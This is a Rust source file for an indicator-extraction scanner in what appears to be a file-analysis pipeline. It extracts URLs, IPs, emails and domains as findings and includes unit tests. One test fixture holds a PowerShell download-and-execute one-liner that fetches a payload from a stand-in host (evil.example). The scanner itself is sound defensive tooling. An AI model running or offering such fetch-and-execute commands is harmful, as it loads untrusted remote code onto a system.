//! Indicator extraction (Phase 4).

use async_trait::async_trait;
use regex::Regex;
use serde_json::json;
use std::sync::OnceLock;

use super::trait_def::{FileScanner, ScannerContext, ScannerOutput};
use crate::models::{ExtractedIndicator, ScanFinding};

fn url_re() -> &'static Regex {
    static RE: OnceLock<Regex> = OnceLock::new();
    RE.get_or_init(|| Regex::new(r"https?://\S+").expect("url regex"))
}

fn domain_re() -> &'static Regex {
    static RE: OnceLock<Regex> = OnceLock::new();
    RE.get_or_init(|| {
        Regex::new(r"(?i)\b(?:[a-z0-9](?:[a-z0-9-]{0,61}[a-z0-9])?\.)+(?:[a-z]{2,63})\b")
            .expect("domain regex")
    })
}

fn ipv4_re() -> &'static Regex {
    static RE: OnceLock<Regex> = OnceLock::new();
    RE.get_or_init(|| {
        Regex::new(
            r"\b(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\b",
        )
        .expect("ipv4 regex")
    })
}

fn email_re() -> &'static Regex {
    static RE: OnceLock<Regex> = OnceLock::new();
    RE.get_or_init(|| {
        Regex::new(r"(?i)\b[a-z0-9._%+-]+@[a-z0-9.-]+\.[a-z]{2,}\b").expect("email regex")
    })
}

pub struct IndicatorExtractor;

fn sanitize_indicator_value(raw: &str) -> String {
    raw.trim()
        .trim_matches(|c: char| {
            matches!(
                c,
                '\'' | '"' | '`' | '<' | '>' | '(' | ')' | '[' | ']' | ';' | ',' | '.'
            )
        })
        .to_string()
}

fn is_noisy_domain(value: &str) -> bool {
    matches!(
        value,
        "net.webclient"
            | "system.net"
            | "system.io"
            | "system.management"
            | "microsoft.win32"
            | "windows.forms"
    )
}

pub fn extract_indicators_from_text(
    text: &str,
    path_inside_archive: Option<&str>,
) -> Vec<ExtractedIndicator> {
    let mut indicators = Vec::new();
    let mut seen = std::collections::HashSet::new();

    for cap in url_re().find_iter(text) {
        let value = sanitize_indicator_value(cap.as_str());
        if value.is_empty() {
            continue;
        }
        if seen.insert(format!("url:{value}")) {
            indicators.push(ExtractedIndicator {
                indicator_type: "url".into(),
                indicator_value: value,
                source_path: path_inside_archive.map(str::to_string),
            });
        }
    }

    for cap in ipv4_re().find_iter(text) {
        let value = sanitize_indicator_value(cap.as_str());
        if value.is_empty() {
            continue;
        }
        if seen.insert(format!("ipv4:{value}")) {
            indicators.push(ExtractedIndicator {
                indicator_type: "ipv4".into(),
                indicator_value: value,
                source_path: path_inside_archive.map(str::to_string),
            });
        }
    }

    for cap in email_re().find_iter(text) {
        let value = sanitize_indicator_value(cap.as_str());
        if value.is_empty() {
            continue;
        }
        if seen.insert(format!("email:{value}")) {
            indicators.push(ExtractedIndicator {
                indicator_type: "email".into(),
                indicator_value: value,
                source_path: path_inside_archive.map(str::to_string),
            });
        }
    }

    for cap in domain_re().find_iter(text) {
        let value = cap.as_str().to_ascii_lowercase();
        if value.contains('@') {
            continue;
        }
        if value.ends_with(".png")
            || value.ends_with(".jpg")
            || value.ends_with(".pdf")
            || value.ends_with(".exe")
        {
            continue;
        }
        if is_noisy_domain(&value) {
            continue;
        }
        if seen.insert(format!("domain:{value}")) {
            indicators.push(ExtractedIndicator {
                indicator_type: "domain".into(),
                indicator_value: value,
                source_path: path_inside_archive.map(str::to_string),
            });
        }
    }

    indicators
}

fn is_textish(ctx: &ScannerContext, data: &[u8]) -> bool {
    if let Some(mime) = ctx.detected_mime_type.as_deref() {
        if mime.starts_with("text/")
            || mime.contains("json")
            || mime.contains("xml")
            || mime.contains("script")
        {
            return true;
        }
    }

    let ext = ctx
        .original_filename
        .rsplit('.')
        .next()
        .map(str::to_ascii_lowercase);
    if matches!(
        ext.as_deref(),
        Some("txt" | "log" | "csv" | "json" | "xml" | "html" | "htm" | "js" | "ps1" | "bat" | "sh" | "py" | "vbs" | "pdf")
    ) {
        return true;
    }

    if data.is_empty() {
        return false;
    }
    let printable = data
        .iter()
        .filter(|&&b| b == b'\n' || b == b'\r' || b == b'\t' || (32..=126).contains(&b))
        .count();
    printable * 100 / data.len() >= 85
}

#[async_trait]
impl FileScanner for IndicatorExtractor {
    fn name(&self) -> &'static str {
        "INDICATOR_EXTRACTOR"
    }

    async fn scan(&self, ctx: &ScannerContext) -> anyhow::Result<ScannerOutput> {
        let data = tokio::fs::read(&ctx.file_path).await?;

        if !is_textish(ctx, &data) {
            return Ok(ScannerOutput {
                engine: self.name().into(),
                version: Some("indicator-v1".into()),
                complete: true,
                findings: vec![],
                metadata: Some(json!({
                    "skipped": true,
                    "extractedIndicators": [],
                })),
            });
        }

        let text = String::from_utf8_lossy(&data);
        let indicators = extract_indicators_from_text(&text, ctx.path_inside_archive.as_deref());

        let findings: Vec<ScanFinding> = indicators
            .iter()
            .map(|ind| ScanFinding {
                engine: self.name().into(),
                code: format!("INDICATOR_{}", ind.indicator_type.to_ascii_uppercase()),
                category: "indicator".into(),
                severity: 5,
                confidence: 70,
                message: format!(
                    "Extracted {} indicator: {}",
                    ind.indicator_type, ind.indicator_value
                ),
                technical_details: Some(json!({
                    "kind": ind.indicator_type,
                    "value": ind.indicator_value,
                })),
                path_inside_archive: ind.source_path.clone(),
            })
            .collect();

        Ok(ScannerOutput {
            engine: self.name().into(),
            version: Some("indicator-v1".into()),
            complete: true,
            findings,
            metadata: Some(json!({
                "extractedIndicators": indicators,
            })),
        })
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn extracts_url_and_email() {
        let text = "Contact admin@example.com or visit https://evil.example/payload";
        let indicators = extract_indicators_from_text(text, None);
        assert!(indicators.iter().any(|i| i.indicator_type == "url"));
        assert!(indicators.iter().any(|i| i.indicator_type == "email"));
    }

    #[test]
    fn strips_trailing_quotes_from_url() {
        let text =
            "iex (New-Object Net.WebClient).DownloadString('https://evil.example/payload.ps1')";
        let indicators = extract_indicators_from_text(text, None);
        let url = indicators
            .iter()
            .find(|i| i.indicator_type == "url")
            .expect("url");
        assert_eq!(url.indicator_value, "https://evil.example/payload.ps1");
        assert!(!indicators.iter().any(|i| i.indicator_value == "net.webclient"));
    }
}
